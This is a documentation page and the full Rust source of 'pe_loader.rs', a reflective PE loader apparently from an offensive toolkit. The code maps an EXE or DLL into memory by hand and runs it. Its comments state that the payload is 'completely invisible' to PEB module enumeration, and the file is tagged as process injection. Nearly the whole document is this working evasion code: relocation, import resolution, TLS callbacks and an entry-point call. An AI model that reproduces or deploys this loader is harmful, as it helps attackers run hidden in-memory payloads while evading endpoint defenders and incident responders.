# crowd — pe_loader.rs  (Reflective PE Loader — PEB-invisible manual mapping)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/pe_loader.rs` |
| **Lines** | 663 |
| **Cards** | T007-process-injection |
| **Role** | Reflective PE loader |
| **Unsafe blocks** | 8 |

## Purpose

# crowd — pe_loader.rs  (Reflective PE Loader — PEB-invisible manual mapping)

Manually maps a PE (EXE or DLL) into memory without LoadLibrary.
The loaded module never appears in the PEB module list — completely invisible
to PEB-walking enumeration (e.g. `NtQueryInformationProcess`, toolhelp snapshots).

## Technique (x64 PE):

1. Parse DOS header → e_lfanew → NT headers (IMAGE_NT_HEADERS64)
2. Allocate memory at preferred ImageBase (or relocate if unavailable)
3. Copy PE headers + map each section to its virtual address
4. Process base relocations (IMAGE_DIRECTORY_ENTRY_BASERELOC)
5. Resolve imports (IMAGE_DIRECTORY_ENTRY_IMPORT) via LoadLibraryA/GetProcAddress
6. Execute TLS callbacks (IMAGE_DIRECTORY_ENTRY_TLS) with DLL_PROCESS_ATTACH
7. Set correct section permissions (.text→XR, .rdata→R, .data→RW)
8. Flush instruction cache
9. Call entry point (EXE: fn() or DLL: DllMain with DLL_PROCESS_ATTACH)

## Constants

- `NT_CURRENT_PROCESS`: `*mut c_void` = `-1isize as *mut c_void`

## Types

### struct `BaseRelocationEntry` (line 55)

### struct `PE` (line 92)

## Public API

### `parse` (line 139)
```rust
pub fn parse(buffer: Vec<u8>) -> Result<Self>
```
Parse a PE from raw bytes.

Validates the DOS signature, NT signature, and ensures all headers and
section table entries fit within the buffer.

### `load` `unsafe` (line 236)
```rust
pub unsafe fn load(&self) -> Result<*mut u8>
```
Load the PE into memory.

1. Allocates virtual memory (preferred base or any available address).
2. Copies PE headers.
3. Maps each section's raw data to its virtual address.
4. Processes base relocations if the image was not loaded at its preferred base.
5. Resolves all imports (IAT fixup).
6. Invokes TLS callbacks with DLL_PROCESS_ATTACH.
7. Sets correct memory protections per section.
8. Flushes the instruction cache.

Returns the base address of the loaded image.

### `execute` `unsafe` (line 341)
```rust
pub unsafe fn execute(&self, base: *mut u8) -> Result<()>
```
Execute the loaded PE at the given base address.

For a DLL: calls DllMain(base, DLL_PROCESS_ATTACH, NULL).
For an EXE: calls the entry point as fn() -> BOOL.

### `run` `unsafe` (line 365)
```rust
pub unsafe fn run(buffer: Vec<u8>) -> Result<()>
```
Parse + Load + Execute in one call.

Convenience method: parses the PE, loads it into memory, and executes it.

## Internal Functions

- `offset` (line 61)
- `reloc_type` (line 66)
- `NtFlushInstructionCache` (line 75)
- `process_relocations` (unsafe) — Walk the base relocation table and apply fixups for the load delta. (line 377)
- `resolve_imports` (unsafe) — Walk the import directory and resolve every thunk via LoadLibraryA + GetProcAddress. (line 453)
- `invoke_tls_callbacks` (unsafe) — Walk the TLS directory and invoke each callback with DLL_PROCESS_ATTACH. (line 539)
- `set_section_permissions` (unsafe) — Set the correct memory protection for each section based on its (line 586)
- `reject_invalid_dos_signature` (line 643)
- `reject_too_small_buffer` (line 656)

## Key Dependencies

- `use anyhow::{anyhow, bail, Context, Result};`
- `use windows::Win32::System::{`
- `use windows::{`
- `use super::*;`

## Full Source

```rust
//! # crowd — pe_loader.rs  (Reflective PE Loader — PEB-invisible manual mapping)
//!
//! Manually maps a PE (EXE or DLL) into memory without LoadLibrary.
//! The loaded module never appears in the PEB module list — completely invisible
//! to PEB-walking enumeration (e.g. `NtQueryInformationProcess`, toolhelp snapshots).
//!
//! ## Technique (x64 PE):
//!
//! 1. Parse DOS header → e_lfanew → NT headers (IMAGE_NT_HEADERS64)
//! 2. Allocate memory at preferred ImageBase (or relocate if unavailable)
//! 3. Copy PE headers + map each section to its virtual address
//! 4. Process base relocations (IMAGE_DIRECTORY_ENTRY_BASERELOC)
//! 5. Resolve imports (IMAGE_DIRECTORY_ENTRY_IMPORT) via LoadLibraryA/GetProcAddress
//! 6. Execute TLS callbacks (IMAGE_DIRECTORY_ENTRY_TLS) with DLL_PROCESS_ATTACH
//! 7. Set correct section permissions (.text→XR, .rdata→R, .data→RW)
//! 8. Flush instruction cache
//! 9. Call entry point (EXE: fn() or DLL: DllMain with DLL_PROCESS_ATTACH)

#![allow(dead_code, non_snake_case)]

use std::{
    ffi::{c_void, CStr},
    mem::{size_of, transmute},
    ptr::null_mut,
};

use anyhow::{anyhow, bail, Context, Result};

use windows::Win32::System::{
    Diagnostics::Debug::*,
    LibraryLoader::{GetProcAddress, LoadLibraryA},
    Memory::*,
    SystemServices::*,
    Threading::*,
    WindowsProgramming::IMAGE_THUNK_DATA64,
};
use windows::{
    core::PCSTR,
    Win32::Foundation::{BOOL, HINSTANCE},
};

// ── Function type aliases ──────────────────────────────────────────────────────

/// Entry point signature for an executable PE.
pub type ExeFn = unsafe extern "system" fn() -> BOOL;

/// Entry point signature for a DLL (DllMain).
pub type DllFn = unsafe extern "system" fn(HINSTANCE, u32, *mut c_void) -> BOOL;

// ── Base relocation entry ──────────────────────────────────────────────────────

/// Packed 16-bit relocation entry: high 4 bits = type, low 12 bits = offset.
#[derive(Debug, Clone, Copy)]
#[repr(C)]
struct BaseRelocationEntry {
    data: u16,
}

impl BaseRelocationEntry {
    #[inline(always)]
    fn offset(&self) -> u16 {
        self.data & 0x0FFF
    }

    #[inline(always)]
    fn reloc_type(&self) -> u16 {
        (self.data >> 12) & 0xF
    }
}

// ── NtFlushInstructionCache import ─────────────────────────────────────────────

#[link(name = "ntdll")]
extern "system" {
    fn NtFlushInstructionCache(
        ProcessHandle: *mut c_void,
        BaseAddress: *const c_void,
        Length: usize,
    ) -> i32;
}

/// Pseudo-handle for the current process (NtCurrentProcess).
const NT_CURRENT_PROCESS: *mut c_void = -1isize as *mut c_void;

// ── PE struct ──────────────────────────────────────────────────────────────────

/// Reflective PE loader — parses, maps, and executes a PE entirely in-memory.
///
/// The loaded image is invisible to PEB module enumeration because we never
/// call LoadLibrary for the payload itself.
#[derive(Debug)]
pub struct PE {
    /// Raw PE file bytes.
    pub buffer: Vec<u8>,

    /// Optional command-line arguments for the PE.
    pub args: String,

    /// Optional export function name to invoke (DLLs only).
    pub export: String,

    /// Pointer into `buffer` — the NT headers.
    pub nt_header: *mut IMAGE_NT_HEADERS64,

    /// Pointer into `buffer` — first section header.
    pub section_header: *mut IMAGE_SECTION_HEADER,

    /// Import directory data.
    pub import_data: IMAGE_DATA_DIRECTORY,

    /// Base relocation directory data.
    pub reloc_data: IMAGE_DATA_DIRECTORY,

    /// TLS directory data.
    pub tls_data: IMAGE_DATA_DIRECTORY,

    /// AddressOfEntryPoint from the optional header.
    pub entry_point: u32,

    /// Preferred image base from the optional header.
    pub image_base: u64,

    /// Total virtual size of the image.
    pub size_of_image: u32,

    /// Whether the PE is a DLL (IMAGE_FILE_DLL characteristic set).
    pub is_dll: bool,
}

// Safety: the raw pointers point into self.buffer which moves with self.
// PE is not Send/Sync by default, and that is fine — it is used on a single thread.
unsafe impl Send for PE {}

impl PE {
    /// Parse a PE from raw bytes.
    ///
    /// Validates the DOS signature, NT signature, and ensures all headers and
    /// section table entries fit within the buffer.
    pub fn parse(buffer: Vec<u8>) -> Result<Self> {
        unsafe {
            if buffer.len() < size_of::<IMAGE_DOS_HEADER>() {
                bail!("PE buffer ({} bytes) is smaller than IMAGE_DOS_HEADER", buffer.len());
            }

            let dos_header = buffer.as_ptr() as *mut IMAGE_DOS_HEADER;

            if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
                bail!(
                    "Invalid DOS signature: expected 0x{:04X}, got 0x{:04X}",
                    IMAGE_DOS_SIGNATURE,
                    (*dos_header).e_magic
                );
            }

            let e_lfanew = std::ptr::read_unaligned(std::ptr::addr_of!((*dos_header).e_lfanew));
            if e_lfanew < 0 {
                bail!("Negative e_lfanew ({}) is invalid", e_lfanew);
            }

            let nt_offset = e_lfanew as usize;
            let nt_end = nt_offset
                .checked_add(size_of::<IMAGE_NT_HEADERS64>())
                .ok_or_else(|| anyhow!("NT header offset overflow"))?;

            if nt_end > buffer.len() {
                bail!(
                    "NT headers extend beyond buffer: offset {} + {} > {}",
                    nt_offset,
                    size_of::<IMAGE_NT_HEADERS64>(),
                    buffer.len()
                );
            }

            let nt_header = (dos_header as usize + nt_offset) as *mut IMAGE_NT_HEADERS64;

            if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
                bail!(
                    "Invalid NT signature: expected 0x{:08X}, got 0x{:08X}",
                    IMAGE_NT_SIGNATURE,
                    (*nt_header).Signature
                );
            }

            // Validate section table fits in buffer
            let num_sections = (*nt_header).FileHeader.NumberOfSections as usize;
            let section_table_size = size_of::<IMAGE_SECTION_HEADER>()
                .checked_mul(num_sections)
                .ok_or_else(|| anyhow!("Section table size overflow ({} sections)", num_sections))?;
            let section_headers_end = nt_end
                .checked_add(section_table_size)
                .ok_or_else(|| anyhow!("Section table offset overflow"))?;

            if section_headers_end > buffer.len() {
                bail!(
                    "Section headers extend beyond buffer: {} > {}",
                    section_headers_end,
                    buffer.len()
                );
            }

            let section_header =
                (nt_header as usize + size_of::<IMAGE_NT_HEADERS64>()) as *mut IMAGE_SECTION_HEADER;

            let opt = &(*nt_header).OptionalHeader;

            Ok(Self {
                nt_header,
                section_header,
                is_dll: ((*nt_header).FileHeader.Characteristics & IMAGE_FILE_DLL)
                    != IMAGE_FILE_CHARACTERISTICS(0),
                import_data: opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize],
                reloc_data: opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize],
                tls_data: opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS.0 as usize],
                entry_point: opt.AddressOfEntryPoint,
                image_base: opt.ImageBase,
                size_of_image: opt.SizeOfImage,
                buffer,
                args: String::new(),
                export: String::new(),
            })
        }
    }

    /// Load the PE into memory.
    ///
    /// 1. Allocates virtual memory (preferred base or any available address).
    /// 2. Copies PE headers.
    /// 3. Maps each section's raw data to its virtual address.
    /// 4. Processes base relocations if the image was not loaded at its preferred base.
    /// 5. Resolves all imports (IAT fixup).
    /// 6. Invokes TLS callbacks with DLL_PROCESS_ATTACH.
    /// 7. Sets correct memory protections per section.
    /// 8. Flushes the instruction cache.
    ///
    /// Returns the base address of the loaded image.
    pub unsafe fn load(&self) -> Result<*mut u8> {
        let size = self.size_of_image as usize;

        // ── Step 1: Allocate memory ──────────────────────────────────────────
        // Try preferred ImageBase first
        let mut base = VirtualAlloc(
            Some(self.image_base as *const c_void),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        ) as *mut u8;

        // If preferred base is unavailable, let the OS choose
        if base.is_null() {
            base = VirtualAlloc(
                None,
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            ) as *mut u8;
        }

        if base.is_null() {
            bail!("VirtualAlloc failed: could not allocate {} bytes for PE image", size);
        }

        // ── Step 2: Copy PE headers ──────────────────────────────────────────
        let headers_size = (*self.nt_header).OptionalHeader.SizeOfHeaders as usize;
        if headers_size > self.buffer.len() {
            bail!(
                "SizeOfHeaders ({}) exceeds buffer length ({})",
                headers_size,
                self.buffer.len()
            );
        }
        std::ptr::copy_nonoverlapping(self.buffer.as_ptr(), base, headers_size);

        // ── Step 3: Map sections ─────────────────────────────────────────────
        let num_sections = (*self.nt_header).FileHeader.NumberOfSections;
        let mut section = self.section_header;

        for i in 0..num_sections {
            let virtual_address = (*section).VirtualAddress as usize;
            let raw_offset = (*section).PointerToRawData as usize;
            let raw_size = (*section).SizeOfRawData as usize;

            if raw_size > 0 {
                let raw_end = raw_offset
                    .checked_add(raw_size)
                    .ok_or_else(|| anyhow!("Section {} raw data overflow", i))?;

                if raw_end > self.buffer.len() {
                    bail!(
                        "Section {} raw data [{:#x}..{:#x}] extends beyond buffer ({})",
                        i,
                        raw_offset,
                        raw_end,
                        self.buffer.len()
                    );
                }

                let src = &self.buffer[raw_offset..raw_end];
                let dst = base.add(virtual_address);
                std::ptr::copy_nonoverlapping(src.as_ptr(), dst, src.len());
            }

            section = section.add(1);
        }

        // ── Step 4: Process relocations ──────────────────────────────────────
        let delta = base as isize - self.image_base as isize;
        if delta != 0 && self.reloc_data.VirtualAddress != 0 && self.reloc_data.Size != 0 {
            self.process_relocations(base, delta)
                .context("Failed to process base relocations")?;
        }

        // ── Step 5: Resolve imports (IAT) ────────────────────────────────────
        if self.import_data.VirtualAddress != 0 && self.import_data.Size != 0 {
            self.resolve_imports(base)
                .context("Failed to resolve imports")?;
        }

        // ── Step 6: TLS callbacks ────────────────────────────────────────────
        if self.tls_data.VirtualAddress != 0 && self.tls_data.Size != 0 {
            self.invoke_tls_callbacks(base)
                .context("Failed to invoke TLS callbacks")?;
        }

        // ── Step 7: Set section permissions ──────────────────────────────────
        self.set_section_permissions(base)
            .context("Failed to set section memory protections")?;

        // ── Step 8: Flush instruction cache ──────────────────────────────────
        let status = NtFlushInstructionCache(NT_CURRENT_PROCESS, base as *const c_void, size);
        if status < 0 {
            bail!("NtFlushInstructionCache failed with NTSTATUS 0x{:08X}", status as u32);
        }

        Ok(base)
    }

    /// Execute the loaded PE at the given base address.
    ///
    /// For a DLL: calls DllMain(base, DLL_PROCESS_ATTACH, NULL).
    /// For an EXE: calls the entry point as fn() -> BOOL.
    pub unsafe fn execute(&self, base: *mut u8) -> Result<()> {
        let entry = base.offset(self.entry_point as isize);

        if self.is_dll {
            let DllMain: DllFn = transmute(entry);
            let result = DllMain(
                HINSTANCE(base as *mut c_void),
                DLL_PROCESS_ATTACH,
                null_mut(),
            );
            if result == BOOL(0) {
                bail!("DllMain returned FALSE — DLL_PROCESS_ATTACH failed");
            }
        } else {
            let Main: ExeFn = transmute(entry);
            Main();
        }

        Ok(())
    }

    /// Parse + Load + Execute in one call.
    ///
    /// Convenience method: parses the PE, loads it into memory, and executes it.
    pub unsafe fn run(buffer: Vec<u8>) -> Result<()> {
        let pe = Self::parse(buffer)?;
        let base = pe.load()?;
        pe.execute(base)
    }

    // ── Internal: Base relocation processing ─────────────────────────────────

    /// Walk the base relocation table and apply fixups for the load delta.
    ///
    /// Supports: DIR64 (type 10), HIGHLOW (type 3), HIGH (type 1),
    /// LOW (type 2), ABSOLUTE (type 0, no-op).
    unsafe fn process_relocations(&self, base: *mut u8, delta: isize) -> Result<()> {
        let mut reloc_block =
            base.add(self.reloc_data.VirtualAddress as usize) as *mut IMAGE_BASE_RELOCATION;
        let reloc_end =
            base.add((self.reloc_data.VirtualAddress + self.reloc_data.Size) as usize);

        while (reloc_block as *mut u8) < reloc_end as *mut u8
            && (*reloc_block).VirtualAddress != 0
            && (*reloc_block).SizeOfBlock >= size_of::<IMAGE_BASE_RELOCATION>() as u32
        {
            let block_base = (*reloc_block).VirtualAddress;
            let block_size = (*reloc_block).SizeOfBlock as usize;

            // Entries start right after the IMAGE_BASE_RELOCATION header
            let mut entry =
                (reloc_block as *mut u8).add(size_of::<IMAGE_BASE_RELOCATION>())
                    as *mut BaseRelocationEntry;
            let block_end =
                (reloc_block as *mut u8).add(block_size) as *mut BaseRelocationEntry;

            while entry < block_end {
                let rtype = (*entry).reloc_type();
                let roffset = (*entry).offset() as u32;
                let target = base.add((block_base + roffset) as usize);

                match rtype as u32 {
                    IMAGE_REL_BASED_DIR64 => {
                        // 64-bit relocation: add full delta
                        let value = (target as *mut i64).read_unaligned();
                        (target as *mut i64).write_unaligned(value.wrapping_add(delta as i64));
                    }
                    IMAGE_REL_BASED_HIGHLOW => {
                        // 32-bit relocation: add truncated delta
                        let value = (target as *mut u32).read_unaligned();
                        (target as *mut u32)
                            .write_unaligned(value.wrapping_add(delta as u32));
                    }
                    IMAGE_REL_BASED_HIGH => {
                        // High 16 bits of the delta
                        let value = (target as *mut u16).read_unaligned() as u32;
                        (target as *mut u16).write_unaligned(
                            value.wrapping_add((delta as u32 >> 16) & 0xFFFF) as u16,
                        );
                    }
                    IMAGE_REL_BASED_LOW => {
                        // Low 16 bits of the delta
                        let value = (target as *mut u16).read_unaligned() as u32;
                        (target as *mut u16)
                            .write_unaligned(value.wrapping_add(delta as u32 & 0xFFFF) as u16);
                    }
                    IMAGE_REL_BASED_ABSOLUTE => {
                        // Padding entry — no-op
                    }
                    _ => {
                        bail!(
                            "Unknown relocation type {} at block VA 0x{:08X} offset 0x{:04X}",
                            rtype,
                            block_base,
                            roffset
                        );
                    }
                }

                entry = entry.add(1);
            }

            // Advance to the next relocation block
            reloc_block = block_end as *mut IMAGE_BASE_RELOCATION;
        }

        Ok(())
    }

    // ── Internal: Import resolution (IAT fixup) ──────────────────────────────

    /// Walk the import directory and resolve every thunk via LoadLibraryA + GetProcAddress.
    unsafe fn resolve_imports(&self, base: *mut u8) -> Result<()> {
        let import_dir =
            base.add(self.import_data.VirtualAddress as usize) as *mut IMAGE_IMPORT_DESCRIPTOR;

        // The import directory is terminated by a null entry (all fields zero).
        // We iterate until we find an entry with Name == 0.
        let mut descriptor = import_dir;

        loop {
            // Terminal entry check: both OriginalFirstThunk and Name are 0
            if (*descriptor).Anonymous.OriginalFirstThunk == 0 && (*descriptor).Name == 0 {
                break;
            }

            let dll_name_ptr = base.add((*descriptor).Name as usize) as *const i8;
            let dll_name = CStr::from_ptr(dll_name_ptr);

            let h_module = LoadLibraryA(PCSTR(dll_name_ptr as *const u8))
                .map_err(|e| anyhow!("LoadLibraryA({:?}) failed: {}", dll_name, e))?;

            // Walk the thunk arrays (OriginalFirstThunk for lookup, FirstThunk for patching)
            let oft_rva = (*descriptor).Anonymous.OriginalFirstThunk;
            let ft_rva = (*descriptor).FirstThunk;

            let mut thunk_offset: isize = 0;
            loop {
                let original_thunk = base.offset(oft_rva as isize + thunk_offset)
                    as *const IMAGE_THUNK_DATA64;
                let first_thunk = base.offset(ft_rva as isize + thunk_offset)
                    as *mut IMAGE_THUNK_DATA64;

                // Terminal thunk: Function field is 0
                if (*original_thunk).u1.Function == 0 {
                    break;
                }

                // Check ordinal bit (bit 63 for x64)
                let resolved = if (*original_thunk).u1.Ordinal & IMAGE_ORDINAL_FLAG64 != 0 {
                    // Import by ordinal
                    let ordinal = ((*original_thunk).u1.Ordinal & 0xFFFF) as u16;
                    GetProcAddress(h_module, PCSTR(ordinal as *const u8))
                } else {
                    // Import by name
                    let import_by_name = base
                        .add((*original_thunk).u1.AddressOfData as usize)
                        as *const IMAGE_IMPORT_BY_NAME;
                    let func_name_ptr = &(*import_by_name).Name as *const i8;
                    GetProcAddress(h_module, PCSTR(func_name_ptr as *const u8))
                };

                match resolved {
                    Some(addr) => {
                        (*first_thunk).u1.Function = addr as u64;
                    }
                    None => {
                        // Build a descriptive error with the function identifier
                        let func_id = if (*original_thunk).u1.Ordinal & IMAGE_ORDINAL_FLAG64 != 0 {
                            format!("ordinal {}", (*original_thunk).u1.Ordinal & 0xFFFF)
                        } else {
                            let import_by_name = base
                                .add((*original_thunk).u1.AddressOfData as usize)
                                as *const IMAGE_IMPORT_BY_NAME;
                            let name = CStr::from_ptr(&(*import_by_name).Name as *const i8);
                            format!("{:?}", name)
                        };

                        bail!(
                            "GetProcAddress failed for {} in {:?}",
                            func_id,
                            dll_name
                        );
                    }
                }

                thunk_offset += size_of::<IMAGE_THUNK_DATA64>() as isize;
            }

            descriptor = descriptor.add(1);
        }

        Ok(())
    }

    // ── Internal: TLS callback invocation ────────────────────────────────────

    /// Walk the TLS directory and invoke each callback with DLL_PROCESS_ATTACH.
    unsafe fn invoke_tls_callbacks(&self, base: *mut u8) -> Result<()> {
        let tls_dir =
            base.add(self.tls_data.VirtualAddress as usize) as *mut IMAGE_TLS_DIRECTORY64;

        let callbacks_ptr = (*tls_dir).AddressOfCallBacks as *mut PIMAGE_TLS_CALLBACK;

        if callbacks_ptr.is_null() {
            return Ok(());
        }

        let mut idx: isize = 0;
        loop {
            let callback = *callbacks_ptr.offset(idx);
            match callback {
                Some(cb) => {
                    cb(
                        base as *mut c_void,
                        DLL_PROCESS_ATTACH,
                        null_mut(),
                    );
                }
                None => break,
            }
            idx += 1;
        }

        Ok(())
    }

    // ── Internal: Section permission enforcement ─────────────────────────────

    /// Set the correct memory protection for each section based on its
    /// IMAGE_SCN_MEM_* characteristics.
    ///
    /// Maps the combination of EXECUTE/READ/WRITE flags to the appropriate
    /// PAGE_* constant:
    ///
    /// | Execute | Read | Write | Protection           |
    /// |---------|------|-------|----------------------|
    /// | yes     | yes  | yes   | PAGE_EXECUTE_READWRITE |
    /// | yes     | yes  | no    | PAGE_EXECUTE_READ    |
    /// | yes     | no   | yes   | PAGE_EXECUTE_WRITECOPY |
    /// | yes     | no   | no    | PAGE_EXECUTE         |
    /// | no      | yes  | yes   | PAGE_READWRITE       |
    /// | no      | yes  | no    | PAGE_READONLY        |
    /// | no      | no   | yes   | PAGE_WRITECOPY       |
    /// | no      | no   | no    | PAGE_NOACCESS        |
    unsafe fn set_section_permissions(&self, base: *mut u8) -> Result<()> {
        let num_sections = (*self.nt_header).FileHeader.NumberOfSections;
        let mut section = self.section_header;

        for i in 0..num_sections {
            let raw_size = (*section).SizeOfRawData as usize;
            let virtual_address = (*section).VirtualAddress as usize;

            // Skip sections with no data or no virtual address
            if raw_size == 0 || virtual_address == 0 {
                section = section.add(1);
                continue;
            }

            let chars = (*section).Characteristics;
            let is_exec =
                (chars & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SECTION_CHARACTERISTICS(0);
            let is_read =
                (chars & IMAGE_SCN_MEM_READ) != IMAGE_SECTION_CHARACTERISTICS(0);
            let is_write =
                (chars & IMAGE_SCN_MEM_WRITE) != IMAGE_SECTION_CHARACTERISTICS(0);

            let protection = match (is_exec, is_read, is_write) {
                (true, true, true) => PAGE_EXECUTE_READWRITE,
                (true, true, false) => PAGE_EXECUTE_READ,
                (true, false, true) => PAGE_EXECUTE_WRITECOPY,
                (true, false, false) => PAGE_EXECUTE,
                (false, true, true) => PAGE_READWRITE,
                (false, true, false) => PAGE_READONLY,
                (false, false, true) => PAGE_WRITECOPY,
                (false, false, false) => PAGE_NOACCESS,
            };

            let mut old_protect = PAGE_PROTECTION_FLAGS(0);
            VirtualProtect(
                base.add(virtual_address) as *const c_void,
                raw_size,
                protection,
                &mut old_protect,
            )
            .map_err(|e| anyhow!("VirtualProtect failed on section {}: {}", i, e))?;

            section = section.add(1);
        }

        Ok(())
    }
}

// ── Tests ──────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// Verify that a minimal DOS header with the wrong magic is rejected.
    #[test]
    fn reject_invalid_dos_signature() {
        let mut buf = vec![0u8; 512];
        // Set an invalid DOS magic (not 'MZ')
        buf[0] = 0x00;
        buf[1] = 0x00;
        let result = PE::parse(buf);
        assert!(result.is_err());
        let msg = format!("{}", result.unwrap_err());
        assert!(msg.contains("DOS signature"), "error: {}", msg);
    }

    /// Verify that a buffer too small for IMAGE_DOS_HEADER is rejected.
    #[test]
    fn reject_too_small_buffer() {
        let buf = vec![0u8; 4];
        let result = PE::parse(buf);
        assert!(result.is_err());
        let msg = format!("{}", result.unwrap_err());
        assert!(msg.contains("smaller"), "error: {}", msg);
    }
}

```